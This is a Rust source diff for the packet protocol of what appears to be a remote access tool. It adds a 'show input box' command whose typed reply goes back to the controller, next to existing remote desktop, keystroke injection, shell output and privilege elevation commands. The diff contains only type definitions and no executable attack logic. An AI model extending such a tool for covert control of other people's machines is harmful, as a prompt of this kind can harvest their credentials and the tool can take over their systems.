@@ -21,6 +21,7 @@ pub enum ServerboundPacket {
     RemoteDesktopFrame(RemoteDesktopFrame),
     ProcessList(ProcessList),
     ShellOutput(String),
+    InputBoxResult(String),
 
     DonwloadFileResult(FileData),
 
@@ -53,6 +54,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::RemoteDesktopFrame(_) => "Remote Desktop Frame",
             ServerboundPacket::ProcessList(_) => "Process List",
             ServerboundPacket::ShellOutput(_) => "Shell Output",
+            ServerboundPacket::InputBoxResult(_) => "Input Box Result",
             ServerboundPacket::DonwloadFileResult(_) => "Donwload File Result",
             ServerboundPacket::DisksResult(_) => "Disks Result",
             ServerboundPacket::FileList(_) => "File List",
@@ -79,6 +81,7 @@ pub enum ClientboundPacket {
     KeyboardInput(KeyboardInputData),
     VisitWebsite(VisitWebsiteData),
     ShowMessageBox(MessageBoxData),
+    ShowInputBox(InputBoxData),
     ElevateClient,
     ManageSystem(String),
 
@@ -142,6 +145,7 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::KeyboardInput(_) => "Keyboard Input",
             ClientboundPacket::VisitWebsite(_) => "Visit Website",
             ClientboundPacket::ShowMessageBox(_) => "Show MessageBox",
+            ClientboundPacket::ShowInputBox(_) => "Show Input Box",
             ClientboundPacket::ElevateClient => "Elevate Client",
             ClientboundPacket::ManageSystem(_) => "Manage System",
             ClientboundPacket::GetProcessList => "Get Process List",
@@ -212,6 +216,12 @@ pub struct MessageBoxData {
     pub message: String,
     pub button: String,
     pub icon: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct InputBoxData {
+    pub title: String,
+    pub message: String,
 }
 
 #[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
